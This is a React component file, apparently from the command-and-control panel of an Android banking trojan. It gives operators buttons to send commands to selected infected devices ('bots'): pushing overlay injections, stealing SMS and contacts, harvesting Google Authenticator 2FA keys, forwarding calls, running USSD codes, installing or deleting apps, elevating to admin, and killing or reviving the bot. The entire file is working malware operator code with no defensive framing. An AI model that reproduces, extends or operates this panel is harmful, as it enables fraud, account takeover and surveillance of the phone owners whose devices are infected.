import PropTypes from 'prop-types';
import React, { useState, useEffect, useRef } from "react";
import InformationCircleIcon from '@heroicons/react/24/solid/InformationCircleIcon';
import SettingsContext from '../../settings';
import Notification from '../Notification/Notification';
import Popup from './popup';
import { format } from 'date-fns';
import $ from 'jquery';
import {
  Dialog,
  DialogTitle,
  DialogContent,
  DialogContentText,
  DialogActions,
  Avatar,
  Box,
  Card,
  Grid,
  Checkbox,
  SvgIcon,
  Button,
  Stack,
  Table,
  TableBody,
  TableCell,
  TableHead,
  CardContent,
  TablePagination,
  Alert,
  AlertTitle,
  TableRow,
  Typography,
  TextField
} from '@mui/material';
import { Scrollbar } from 'src/components/scrollbar';
import { getInitials } from 'src/utils/get-initials';

import { toast } from 'react-toastify';

import 'react-toastify/dist/ReactToastify.css';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faArrowsRotate, faArrowUpRightFromSquare, faBell, faBoxOpen, faCloudArrowDown, faContactBook, faDownload, faElevator, faEllipsis, faFingerprint, faK, faKey, faLink, faListCheck, faMobile, faPaperPlane, faPhone, faPhoneVolume, faSatelliteDish, faSkull, faSms, faTowerCell, faTrashCan, faTruckMedical } from '@fortawesome/free-solid-svg-icons';

import Sendinj from '../commands/sendinj';
import OpenUrl from '../commands/openurl';
import Ussd from '../commands/ussd';
import Startapp from '../commands/startapp';
import DelApp from '../commands/delapp';
import SendSMS from '../commands/sendsms';
import Forward from '../commands/forward';
import Push from '../commands/push';
import InstallApp from '../commands/installapp';

export const Commands = (props) => {
  const {
    selected = [],
  } = props;

  const [notificationVisible, setNotificationVisible] = useState(false)
  const [Pushseverity, setPushSeverity] = useState("success")
  const [Pushtitle, setPushTitle] = useState("Success")
  const [Pushmessage, setPushMessage] = useState("success")

  const [openSendInjPopup, setopenSendInjPopup] = useState(false);
  const [openUrlPopup, setopenUrlPopup] = useState(false);
  const [openUssdPopup, setopenUssdPopup] = useState(false);
  const [openStartAppPopup, setopenStartAppPopup] = useState(false);
  const [openDelAppPopup, setopenDelAppPopup] = useState(false);
  const [openInstallAppPopup, setopenInstallAppPopup] = useState(false);
  const [openSendSMSPopup, setopenSendSMSPopup] = useState(false);
  const [openForwardCallPopup, setopenForwardCallPopup] = useState(false);
  const [openPushPopup, setopenPushPopup] = useState(false);

  const cardStyles = {
    height: 320,
    width: 195,
    
  };

  const buttonstyles = {
    mt: 2, width: 115, height: 42
  };

  const firstbuttonstyles = {
    mt: 3, width: 115, height: 42
  };

  function SendErrorToast(text) {
    toast.error(text);
  }

  function SendSuccessToast(text) {
    toast.success(text);
  }

  function SendCommand(command) {
    let request = $.ajax({
        type: 'POST',
        url: SettingsContext.restApiUrl,
        data: {
            'params': new Buffer(
                '{"' + 
                'request":"botsSetCommand",' + 
                '"idbot":"' + selected.join(',') + '",' + 
                '"command":"' + new Buffer('{"name":"' + command + '"}').toString('base64') + '"' + 
                ',"password":"' + SettingsContext.password + ' "}').toString('base64')
        }
    });
}

    return (
      <Box sx={{ Width: 800 }}>
      <Grid container mt={1} ml={0} mr={1} spacing={2}>
        <Grid item xs={2}>
          <Card style={cardStyles}>
            <CardContent>
              <center><Typography variant='h5' flexGrow={0}><FontAwesomeIcon icon={faKey}/> Injections</Typography>

              <Button onClick={()=> {if (selected.length > 0) { setopenSendInjPopup(true)} else { SendErrorToast("You need to select some bots before performing this action");  } }} sx={firstbuttonstyles} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faPaperPlane} /></SvgIcon>)}variant="contained">Send</Button>
              <Sendinj
              openPopup={openSendInjPopup}
              setOpenPopup={setopenSendInjPopup}
              selected={selected}
              />
              <Button onClick={()=> {if (selected.length > 0) { SendCommand("updateInjectAndListApps"); SendSuccessToast("Sent request to update injection-list of client");} else { SendErrorToast("You need to select some bots before performing this action")} }} sx={buttonstyles} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faArrowsRotate} /></SvgIcon>)}variant="contained">Update</Button>
              </center>
            </CardContent>
          </Card>
        </Grid>
        <Grid item xs={2}>
          <Card style={cardStyles}>
            <CardContent>
              <center><Typography variant='h5' flexGrow={0}><FontAwesomeIcon icon={faMobile}/> Apps</Typography>

              <Button onClick={()=> {if (selected.length > 0) { SendCommand("getInstallApps"); SendSuccessToast("Sent request to save Installed Apps of client");} else { SendErrorToast("You need to select some bots before performing this action"); } }} sx={firstbuttonstyles} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faCloudArrowDown} /></SvgIcon>)}variant="contained">Installed</Button>
              <Button onClick={()=> {if (selected.length > 0) { setopenDelAppPopup(true)} else { SendErrorToast("You need to select some bots before performing this action"); } }} sx={buttonstyles} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faTrashCan} /></SvgIcon>)}variant="contained">Delete</Button>
              <DelApp
              openPopup={openDelAppPopup}
              setOpenPopup={setopenDelAppPopup}
              selected={selected}
              />
              <Button onClick={()=> {if (selected.length > 0) { setopenStartAppPopup(true)} else { SendSuccessToast("You need to select some bots before performing this action"); } }} sx={buttonstyles} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faArrowUpRightFromSquare} /></SvgIcon>)}variant="contained">Open</Button>
              <Startapp
              openPopup={openStartAppPopup}
              setOpenPopup={setopenStartAppPopup}
              selected={selected}
              />
              <Button onClick={()=> {if (selected.length > 0) { setopenInstallAppPopup(true)} else { SendSuccessToast("You need to select some bots before performing this action"); } }} sx={buttonstyles} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faDownload} /></SvgIcon>)}variant="contained">Install</Button></center>
              <InstallApp
              openPopup={openInstallAppPopup}
              setOpenPopup={setopenInstallAppPopup}
              selected={selected}
              />
            </CardContent>
          </Card>
        </Grid>
        <Grid item xs={2}>
          <Card style={cardStyles} >
            <CardContent>
              <center><Typography variant='h5' flexGrow={0}><FontAwesomeIcon icon={faListCheck}/> Manage</Typography>

              <Button onClick={()=> {if (selected.length > 0) { SendCommand("updateModule"); SendSuccessToast("Sent request to update module of client");} else { SendErrorToast("You need to select some bots before performing this action"); } }} sx={firstbuttonstyles} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faArrowsRotate} /></SvgIcon>)}variant="contained">Update</Button>
              <Button onClick={()=> {if (selected.length > 0) { SendCommand("startAdmin"); SendSuccessToast("Sent request to elevate client to admin priveleges");} else { SendErrorToast("You need to select some bots before performing this action"); } }} sx={buttonstyles} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faElevator} /></SvgIcon>)}variant="contained">Elevate</Button>
              <Button onClick={()=> {if (selected.length > 0) { SendCommand("undead"); SendSuccessToast("Sent request to undead Client. Will only be executed on next knock!");} else { SendErrorToast("You need to select some bots before performing this action"); } }} sx={buttonstyles} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faTruckMedical} /></SvgIcon>)}variant="contained">Undead</Button>
              <Button onClick={()=> {if (selected.length > 0) { SendCommand("killMe"); SendSuccessToast("Sent request to kill Client");} else { SendErrorToast("You need to select some bots before performing this action"); } }} sx={buttonstyles} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faSkull} /></SvgIcon>)}variant="contained">Kill Bot</Button></center>
            </CardContent>
          </Card>
        </Grid>
        <Grid item xs={2}>
          <Card style={cardStyles} >
            <CardContent>
              <center><Typography variant='h5' flexGrow={0}><FontAwesomeIcon icon={faSms}/> SMS</Typography>

              <Button onClick={()=> {if (selected.length > 0) { setopenSendSMSPopup(true)} else { SendErrorToast("You need to select some bots before performing this action"); } }} sx={firstbuttonstyles} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faPaperPlane} /></SvgIcon>)}variant="contained">Send</Button>
              
              <SendSMS
              openPopup={openSendSMSPopup}
              setOpenPopup={setopenSendSMSPopup}
              selected={selected}
              />

              <Button onClick={()=> {if (selected.length > 0) { SendCommand("getSMS"); SendSuccessToast("Sent request to save all SMS from client");} else { SendErrorToast("You need to select some bots before performing this action"); } }} sx={buttonstyles} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faSatelliteDish} /></SvgIcon>)}variant="contained">Receive</Button></center>
            </CardContent>
          </Card>
        </Grid>
        <Grid item xs={2}>
          <Card style={cardStyles} >
            <CardContent>
              <center><Typography variant='h5' flexGrow={0}><FontAwesomeIcon icon={faPhone}/> Phone</Typography>

              <Button onClick={()=> {if (selected.length > 0) { setopenForwardCallPopup(true)} else { SendErrorToast("You need to select some bots before performing this action"); } }} sx={firstbuttonstyles} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faPhoneVolume} /></SvgIcon>)}variant="contained">Forward</Button>
              <Forward
              openPopup={openForwardCallPopup}
              setOpenPopup={setopenForwardCallPopup}
              selected={selected}
              />
              <Button onClick={()=> {if (selected.length > 0) { setopenUssdPopup(true)} else { SendErrorToast("You need to select some bots before performing this action"); } }} sx={buttonstyles} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faTowerCell} /></SvgIcon>)}variant="contained">USSD</Button>
              <Ussd
              openPopup={openUssdPopup}
              setOpenPopup={setopenUssdPopup}
              selected={selected}
              />
              <Button onClick={()=> {if (selected.length > 0) { SendCommand("getContacts"); SendSuccessToast("Sent request to save contacts of client");} else { SendErrorToast("You need to select some bots before performing this action"); } }} sx={buttonstyles} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faContactBook} /></SvgIcon>)}variant="contained">Contacts</Button></center>
            </CardContent>
          </Card>
        </Grid>
        <Grid item xs={2}>
          <Card style={cardStyles} >
            <CardContent>
              <center><Typography variant='h5' flexGrow={0}><FontAwesomeIcon icon={faEllipsis}/> Other</Typography>

              <Button  onClick={()=> {if (selected.length > 0) { setopenUrlPopup(true)} else { SendErrorToast("You need to select some bots before performing this action"); } }} sx={firstbuttonstyles} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faLink} /></SvgIcon>)}variant="contained">URL</Button>
              <OpenUrl
              openPopup={openUrlPopup}
              setOpenPopup={setopenUrlPopup}
              selected={selected}
              />

              <Button onClick={()=> {if (selected.length > 0) { SendCommand("startAuthenticator2"); SendSuccessToast("Sent request to gather 2FA keys from GAUTH on selected clients");} else { SendErrorToast("You need to select some bots before performing this action");}}} sx={buttonstyles} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faFingerprint} /></SvgIcon>)}variant="contained">GAUTH</Button>
              <Button onClick={()=> {if (selected.length > 0) { setopenPushPopup(true)} else { SendErrorToast("You need to select some bots before performing this action"); } }} sx={buttonstyles} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faBell} /></SvgIcon>)}variant="contained">PUSH</Button></center>
              <Push
              openPopup={openPushPopup}
              setOpenPopup={setopenPushPopup}
              selected={selected}
              />
            </CardContent>
          </Card>
        </Grid>
      </Grid>
      {notificationVisible && (
        <Notification
          severity={Pushseverity}
          title={Pushtitle}
          message={Pushmessage}
          duration={5000}
        />
      )}


        
      </Box>
    );
  }


Commands.propTypes = {
  count: PropTypes.number,
  items: PropTypes.array,
  onDeselectAll: PropTypes.func,
  onDeselectOne: PropTypes.func,
  onPageChange: PropTypes.func,
  onRowsPerPageChange: PropTypes.func,
  onSelectAll: PropTypes.func,
  onSelectOne: PropTypes.func,
  page: PropTypes.number,
  rowsPerPage: PropTypes.number,
  selected: PropTypes.array
};